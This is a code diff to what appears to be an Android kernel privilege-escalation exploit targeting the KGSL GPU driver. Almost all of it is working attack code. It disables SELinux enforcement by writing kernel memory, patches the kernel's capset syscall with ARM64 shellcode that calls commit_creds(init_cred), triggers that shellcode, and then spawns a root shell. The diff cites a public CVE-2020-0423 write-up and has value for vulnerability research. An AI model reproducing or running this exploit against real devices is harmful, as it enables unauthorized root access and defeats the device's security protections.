@@ -12,6 +12,7 @@
 #include <string.h>
 #include <stdbool.h>
 #include <sys/wait.h>
+#include <sys/capability.h>
 
 #define KGSL_MEMFLAGS_IOCOHERENT 0x80000000ULL
 
@@ -603,15 +604,64 @@ int main() {
 
     // TODO(zhuowei): this is dumped from vmlinux-to-elf/kallsyms-finder on my computer and is specific to 51052260106700520 - need to auto detect this
     uint64_t kernel_virtual_base = kallsyms_lookup.kallsyms_relative_base;
-    uint64_t kernel_selinux_state_addr = cheese_kallsyms_lookup(&kallsyms_lookup, "selinux_state");;
+    uint64_t kernel_selinux_state_addr = cheese_kallsyms_lookup(&kallsyms_lookup, "selinux_state");
     bool* kernel_selinux_state_enforcing_ptr = kernel_physical_base + (kernel_selinux_state_addr - kernel_virtual_base);
     fprintf(stderr, "%lx: %p\n", (kernel_selinux_state_addr - kernel_virtual_base), kernel_selinux_state_enforcing_ptr);
     *kernel_selinux_state_enforcing_ptr = false;
     __builtin___clear_cache((char*)kernel_selinux_state_enforcing_ptr, (char*)kernel_selinux_state_enforcing_ptr + 1);
-    // stupider cache flush...
+
+    uint64_t init_cred_addr = cheese_kallsyms_lookup(&kallsyms_lookup, "init_cred");
+    uint64_t commit_creds_addr = cheese_kallsyms_lookup(&kallsyms_lookup, "commit_creds");
+
+#define LO_DWORD(a) (a & 0xffffffff)
+#define HI_DWORD(a) (a >> 32)
+
+    // https://www.longterm.io/cve-2020-0423.html
+    uint32_t shellcode[] = {
+        // commit_creds(init_cred)
+        0x58000040, // ldr x0, .+8
+        0x14000003, // b   .+12
+        LO_DWORD(init_cred_addr),
+        HI_DWORD(init_cred_addr),
+        0x58000041, // ldr x1, .+8
+        0x14000003, // b   .+12
+        LO_DWORD(commit_creds_addr),
+        HI_DWORD(commit_creds_addr),
+        0xA9BF7BFD, // stp x29, x30, [sp, #-0x10]!
+        0xD63F0020, // blr x1
+        0xA8C17BFD, // ldp x29, x30, [sp], #0x10
+    
+        0x2A1F03E0, // mov w0, wzr
+        0xD65F03C0, // ret
+    };
+
+    uint64_t kernel___do_sys_capset_addr = cheese_kallsyms_lookup(&kallsyms_lookup, "__do_sys_capset");
+    bool* kernel___do_sys_capset_ptr = kernel_physical_base + (kernel___do_sys_capset_addr - kernel_virtual_base);
+
+    /* Saving sys_capset current code */
+    uint8_t sys_capset[sizeof(shellcode)];
+    memcpy(sys_capset, kernel___do_sys_capset_ptr, sizeof(sys_capset));
+    /* Patching sys_capset with our shellcode */
+    memcpy(kernel___do_sys_capset_ptr, shellcode, sizeof(shellcode));
+
+    // stupidest cache flush...
     void* garbage = malloc(0x1000000);
     memset(garbage, 0x41, 0x1000000);
     free(garbage);
+
+    /* Calling our patched version of sys_capset */
+    #pragma clang diagnostic push
+    #pragma clang diagnostic ignored "-Wnonnull"
+    int err = capset(NULL, NULL);
+    #pragma clang diagnostic pop
+    if (err) {
+        fprintf(stderr, "capset returned %d\n", err);
+        return 1;
+    }
+    /* Restoring sys_capset */
+    memcpy(kernel___do_sys_capset_ptr, sys_capset, sizeof(sys_capset));
+
+    execl("/system/bin/sh", "sh", NULL);
 
     return 0;
 }
